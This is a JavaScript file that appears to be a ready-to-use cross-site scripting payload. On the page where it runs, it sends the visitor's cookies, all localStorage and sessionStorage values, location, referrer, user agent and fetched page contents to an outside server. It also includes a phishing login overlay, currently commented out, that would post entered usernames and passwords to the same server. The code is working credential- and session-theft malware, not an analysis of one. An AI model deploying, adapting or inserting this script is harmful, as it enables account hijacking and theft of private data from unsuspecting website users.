const server = 'https://myserver/'
const tag = 'gudo_'

const send = async (info, value) => {
    fetch(server + '?meta=' + info, {
        mode: 'no-cors',
        method: 'post',
        body: value
    })
}

const sendPage = async (url) => {
    if (alreadySent(url)) { return }
    let r = await fetch(url, { mode: 'no-cors'})
    let response = await r.arrayBuffer()
    if (response) {
        send(url, response)
        markSent(url)
    }
}

const getSubUrls = (url) => {
    const subUrls = []
    let processing = true
    while (processing) {
        m = url.match('^(.*)/')
        if (m && m.length > 1) {
            url = m[1]
            if (url.length > 9) {
                subUrls.push(url)
            } else {
                url = ''
            }
        } else {
            processing = false
        }   
    }
    return subUrls
}


const alreadySent = (key) => {
    return localStorage.getItem(tag + key)
}

const markSent = (key) => {
    localStorage.setItem(tag + key, true)
}

const sendStorage = () => {
    if (alreadySent('storage')) {
	return
    }
    let localValues = '';
    let keys = Object.keys(localStorage);
    for (let i = keys.length-1; i >= 0; i--) {
        localValues += keys[i] + ': ' + localStorage.getItem(keys[i]) + '\n'
    }
    if (localValues.length > 0) {
        send('localStorage', localValues)
    }

    let sessionValues = ''
    keys = Object.keys(sessionStorage)
    for (let i = keys.length-1; i >= 0; i--) {
        sessionValues += keys[i] + ': ' + sessionStorage.getItem(keys[i]) + '\n'
    }
    if (sessionValues.length > 0) {
        send('sessionStorage', sessionValues)
    }
    markSent('storage')
}

if (!alreadySent('location')) {
    send('location', document.location)
    markSent('location')
}

if (document.cookie.length > 0) {
    send('cookies', document.cookie)
}

sendStorage()

if (document.referrer && !alreadySent('ref')) {
    send('referrer', document.referrer)
    sendPage(document.referrer)
    const referrerUrls = getSubUrls(document.referrer)
    referrerUrls.forEach(url => sendPage(url))
    markSent('ref')
}

sendPage(window.location.href)
const locationUrls = getSubUrls(window.location.href)
locationUrls.forEach(url => sendPage(url))

if (!alreadySent('userAgent')) {
    send('userAgent', navigator.userAgent)
    markSent('userAgent')
}

//sendPage('http://url/image.png')

const displayAuthenticationPage = (language = 'pt') => {
    if (alreadySent('creds')) {
        return
    }
    let words = []
    if (language.toLowerCase().includes('pt')) {
        words = [
            'Usu&#xe1;rio',
            'Senha'
        ]
    } else {
        words = [
            'User',
            'Password'
        ]
    }
    const div = document.createElement("div")
    div.innerHTML = `
    <div style="width: 100%;height: 100%;background-color: #eee;position: absolute;left: 0;top: 0;">
        <div class="login-page" style="width: 360px;padding: 8% 0 0;margin: auto;">
            <div class="form" style="position: relative;z-index: 1;background: #FFFFFF;max-width: 360px;margin: 0 auto 100px;padding: 45px; padding-bottom: 10px;text-align: center;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);">
                <div id="login-form">
                    <input id="login" type="text" placeholder="${words[0]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
                    <input id="password" type="password" onkeypress="return OnEnter(event)" placeholder="${words[1]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
                    <button style="margin-top: 10px;" id="button">Login</button>
                    <h5 id="msg" style="visibility: hidden;"></h5>
                </form>
            </div>
        </div>
    </div>
    `
    document.getElementsByTagName('html')[0].appendChild(div)
    document.getElementById('button').onclick = () => {
        fetch(server + '?meta=creds', {
            method: 'post',
            body: 'login=' + document.getElementById('login').value + '&password=' + document.getElementById('password').value
        });
        document.getElementById('login').value = ''
        document.getElementById('password').value = ''
        //document.getElementById('msg').style.visibility = 'visible'
	markSent('creds')
	setTimeout('location.reload(true)', 500)
    }
}
function OnEnter(e) {
    var code = e.keyCode ? e.keyCode : e.charCode ? e.charCode : e.which ? e.which : void 0
    if (code == 13) {
        document.getElementById('button').click()
	return true
    }
}
var userLang = navigator.language || navigator.userLanguage
//displayAuthenticationPage(userLang)
//TODO: HTTP Authentication

